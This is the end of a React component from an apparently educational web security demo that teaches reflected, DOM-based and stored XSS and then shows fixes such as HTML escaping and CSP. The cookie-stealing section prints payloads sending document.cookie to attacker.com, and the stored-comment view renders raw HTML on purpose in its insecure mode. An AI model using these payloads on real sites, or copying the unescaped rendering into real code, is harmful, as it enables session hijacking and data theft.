                </div>
              )}
              
              {/* Explanation */}
              <div className="mt-4 p-4 bg-blue-50 border-2 border-blue-300 rounded-lg">
                <h5 className="font-semibold text-blue-900 mb-3 flex items-center gap-2">
                  <span>📖</span>
                  <span>How Reflected XSS Works (Step-by-Step):</span>
                </h5>
                <ol className="list-decimal list-inside space-y-2 text-blue-800 text-sm">
                  <li className="font-semibold">
                    Attacker crafts a malicious URL with XSS payload
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      Example: <code className="bg-blue-100 px-1 rounded">site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                    </div>
                  </li>
                  <li className="font-semibold">
                    Payload is sent to users via email, social media, or other channels
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      "Check out this amazing deal!" - with hidden malicious URL
                    </div>
                  </li>
                  <li className="font-semibold">
                    User clicks the link and visits the vulnerable site
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      User trusts the link and clicks it
                    </div>
                  </li>
                  <li className="font-semibold">
                    Site reflects the payload in the response without encoding
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      The search query appears directly in the HTML response
                    </div>
                  </li>
                  <li className="font-semibold">
                    XSS executes in user's browser, compromising their session
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      Cookies, session IDs, and personal data can be stolen
                    </div>
                  </li>
                  <li className="font-semibold">
                    Each user who clicks the link is individually affected
                    <div className="text-xs text-blue-600 font-normal ml-4 mt-1">
                      Unlike Stored XSS, this doesn't persist - but affects each victim separately
                    </div>
                  </li>
                </ol>
                <div className="mt-3 p-2 bg-yellow-100 border border-yellow-300 rounded">
                  <strong className="text-yellow-800">💡 Key Point for Students:</strong>
                  <p className="text-xs text-yellow-700 mt-1">
                    Reflected XSS requires social engineering - the attacker must trick users into 
                    clicking a malicious link. However, it's still very dangerous because it can 
                    affect many users if the link is widely shared!
                  </p>
                </div>
              </div>
              
              {/* Shareable Malicious URL */}
              {reflectedAttackExecutions.length > 0 && searchResults && (
                <div className="mt-4 p-4 bg-yellow-50 border border-yellow-300 rounded">
                  <h5 className="font-semibold text-yellow-900 mb-2">🔗 Malicious URL (for demonstration):</h5>
                  <div className="bg-white p-2 rounded border border-yellow-200">
                    <code className="text-xs break-all text-yellow-800">
                      {reflectedAttackExecutions[0]?.url}
                    </code>
                  </div>
                  <p className="text-xs text-yellow-700 mt-2">
                    ⚠️ In a real attack, this URL would be sent to victims via email or social engineering.
                    Anyone who clicks it will execute the XSS payload.
                  </p>
                </div>
              )}
            </div>
          </DemoCard>
        </>
      )}
      
      {/* DOM-based XSS Demo */}
      {activeTab === 'dom' && (
        <>
          <DemoCard 
            title="DOM-based XSS Attack" 
            badge="Demo"
          >
            <p className="mb-4 text-gray-700">
              DOM-based XSS occurs when JavaScript code manipulates the DOM using untrusted data.
              The vulnerability exists entirely in client-side code.
            </p>
            <Alert type="info">
              This is a client-side vulnerability. Try manipulating the URL hash: 
              <code className="bg-gray-200 px-1 rounded ml-1">#&lt;img src=x onerror='alert("XSS")'&gt;</code>
            </Alert>
            <div className="mt-4">
              <h4 className="font-semibold mb-2">Example DOM Manipulation:</h4>
              <CodeBlock
                code={`// Vulnerable code
const hash = window.location.hash.substring(1);
document.getElementById('output').innerHTML = hash; // VULNERABLE!

// User navigates to: page.html#<img src=x onerror='alert("XSS")'>
// Result: XSS executes!`}
                language="javascript"
              />
            </div>
          </DemoCard>
        </>
      )}
      
      {/* Cookie Stealing Demo */}
      {activeTab === 'cookie-stealing' && (
        <>
          <DemoCard 
            title="Cookie & Session Stealing Attack" 
            badge={isSecure ? 'Secure' : 'Vulnerable'}
          >
            <p className="mb-4 text-gray-700">
              XSS can be used to steal cookies and session IDs, allowing attackers to hijack user sessions.
            </p>
            <div className="space-y-4">
              <Button onClick={handleGetSessionInfo}>
                Get Current Session Information
              </Button>
              {sessionInfo && (
                <div className="mt-4 p-4 bg-gray-50 rounded border">
                  <h4 className="font-semibold mb-2">Session Information:</h4>
                  <CodeBlock
                    code={JSON.stringify(sessionInfo, null, 2)}
                    language="json"
                  />
                  {!isSecure && (
                    <Alert type="danger" className="mt-2">
                      ⚠️ This information can be stolen via XSS! An attacker could inject:
                      <CodeBlock
                        code={`<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
  fetch('http://attacker.com/steal?session=' + '${sessionInfo.sessionId}');
</script>`}
                        language="javascript"
                        className="mt-2"
                      />
                    </Alert>
                  )}
                </div>
              )}
              <div className="mt-4">
                <h4 className="font-semibold mb-2">Cookie Stealing Payload:</h4>
                <CodeBlock
                  code={`// Stored XSS payload that steals cookies
<script>
  // Method 1: Send to attacker server
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
  
  // Method 2: Using Image tag (works even if fetch is blocked)
  new Image().src = 'http://attacker.com/steal?cookie=' + document.cookie;
  
  // Method 3: Redirect with cookies
  document.location = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>`}
                  language="javascript"
                />
              </div>
            </div>
          </DemoCard>
        </>
      )}
      
      {/* Comments Display - Only show for Stored XSS */}
      {activeTab === 'stored' && (
      <DemoCard 
        title="Comments" 
        badge={comments.length > 0 ? `${comments.length} comments` : 'No comments'}
      >
        {comments.length === 0 ? (
          <p className="text-gray-500">No comments yet. Be the first to comment!</p>
        ) : (
          <div className="space-y-4">
            {comments.map((item, idx) => (
              <div 
                key={idx} 
                className="border border-gray-200 rounded-lg p-4 bg-gray-50"
              >
                <div className="mb-2">
                  <Badge variant="info" className="text-xs">Comment #{idx + 1}</Badge>
                </div>
                <div className="mb-2">
                  <strong className="text-sm text-gray-700">Raw Input:</strong>
                  <CodeBlock 
                    code={item.text}
                    language="text"
                    className="mt-1"
                  />
                </div>
                <div>
                  <strong className="text-sm text-gray-700">Rendered Output:</strong>
                  <div 
                    className={`mt-2 p-3 rounded border ${
                      isSecure ? 'bg-white border-green-200' : 'bg-white border-red-200'
                    }`}
                    dangerouslySetInnerHTML={isSecure 
                      ? { __html: escapeHtml(item.text) }
                      : { __html: item.text }
                    }
                  />
                </div>
              </div>
            ))}
          </div>
        )}
      </DemoCard>
      )}
      
      {/* Code Comparison */}
      <DemoCard title="Code Comparison" badge="Implementation">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <div>
            <h4 className="font-semibold text-red-600 mb-2">Vulnerable Code</h4>
            <CodeBlock
              code={`// Insecure: Direct HTML rendering
<div>{comment.text}</div>

// User input: <script>alert('XSS')</script>
// Result: Script executes!`}
              language="javascript"
            />
          </div>
          <div>
            <h4 className="font-semibold text-green-600 mb-2">Secure Code</h4>
            <CodeBlock
              code={`// Secure: HTML entity encoding
<div>{escapeHtml(comment.text)}</div>

// User input: <script>alert('XSS')</script>
// Result: Displayed as text, no execution`}
              language="javascript"
            />
          </div>
        </div>
      </DemoCard>
      
      {/* Mitigation Explanation */}
      <DemoCard title="Secure Implementation" badge="Best Practices">
        <div className="space-y-4">
          <div>
            <h4 className="font-semibold text-gray-900 mb-2">HTML Entity Encoding</h4>
            <p className="text-gray-700 mb-3">
              Convert special characters to their HTML entity equivalents. This prevents browsers 
              from interpreting user input as HTML or JavaScript.
            </p>
            <CodeBlock
              code={`function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Usage
<div dangerouslySetInnerHTML={{ 
  __html: escapeHtml(userInput) 
}} />`}
              language="javascript"
            />
          </div>
          
          <div>
            <h4 className="font-semibold text-gray-900 mb-2">Additional Security Measures</h4>
            <ul className="list-disc list-inside space-y-1 text-gray-700">
              <li><strong>Content Security Policy (CSP):</strong> Restrict which scripts can execute</li>
              <li><strong>Input Validation:</strong> Validate and sanitize all user input</li>
              <li><strong>Output Encoding:</strong> Always encode output based on context (HTML, JavaScript, URL)</li>
              <li><strong>Use Framework Features:</strong> React automatically escapes by default</li>
            </ul>
          </div>
        </div>
      </DemoCard>
    </div>
  );
};

export default XSS;
